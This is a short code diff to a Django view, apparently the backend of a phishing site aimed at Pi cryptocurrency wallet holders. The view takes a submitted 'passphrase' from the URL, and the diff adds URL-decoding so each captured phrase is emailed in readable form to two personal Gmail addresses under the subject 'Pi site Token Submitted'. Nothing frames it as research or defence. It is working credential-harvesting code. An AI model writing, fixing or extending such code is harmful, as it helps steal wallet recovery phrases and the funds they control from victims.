@@ -2,6 +2,7 @@ from django.shortcuts import render
 from firebmail import sendmail as sending_no
 from datetime import datetime
 from django.http import HttpResponse
+from urllib.parse import unquote
 
 
 current_date = datetime.now()
@@ -17,9 +18,9 @@ def send_notify(subject, payload, email_to):
     return sending_no(payload, recipient, sender,password, subject)
 
 def sendmail(request, keys):
-    print(formatted_time)
-    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
+    decoded_param = unquote(keys)
+    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
                     
-    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
+    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {decoded_param} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
     
     return HttpResponse('done')
